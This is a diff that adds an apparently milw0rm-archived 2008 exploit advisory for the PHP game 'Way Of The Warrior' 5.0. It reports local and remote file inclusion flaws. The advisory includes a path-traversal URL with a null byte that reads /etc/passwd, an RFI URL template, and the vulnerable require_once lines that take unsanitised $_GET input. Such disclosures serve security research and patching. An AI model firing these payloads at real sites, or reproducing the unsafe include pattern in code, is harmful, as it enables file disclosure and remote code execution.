@@ -1,0 +1,53 @@
+
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ ##################################################################
+ #  [ wotw <= 5.0 ]   Local/Remote File Inclusion Vulnerability   #
+ ##################################################################
+ # 
+ # Script: "Way Of The Warrior is a web boardgame of fantasy battle..."
+ #
+ # Script site: http://wotw.altervista.org/
+ # Download: http://sourceforge.net/project/platformdownload.php?group_id=178414
+ #
+ # [LFI] Vuln: http://site.com/wotw_5.0_en/visualizza.php?plancia=../../../../../../etc/passwd%00
+ #      
+ # Bug: ./wotw_5.0_en/visualizza.php (line: 17)
+ #
+ # ...
+ # 	require_once("plance/".$_GET['plancia'].".php"); 	// LFI
+ # ... 	 
+ #
+ #
+ # [RFI] Vuln: http://site.com/wotw_5.0_en/crea.php?plancia=[spread?]
+ #      
+ # Bug: ./wotw_5.0_en/visualizza.php (lines: 12-19)
+ #
+ # ...
+ # 	if(isset($_GET['plancia']))
+ #   	{
+ #    	require_once("configurazione/tipi.php");
+ #    	require_once("unita/unita.php");
+ #    	require_once("plance/plance.php");
+ #    	require_once("giocatori/giocatori.php");
+ #    	require_once("terreni/terreni.php");
+ #    	require_once("".$_GET['plancia']); 			// RFI
+ # ... 	 
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2008 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2008-11-04]
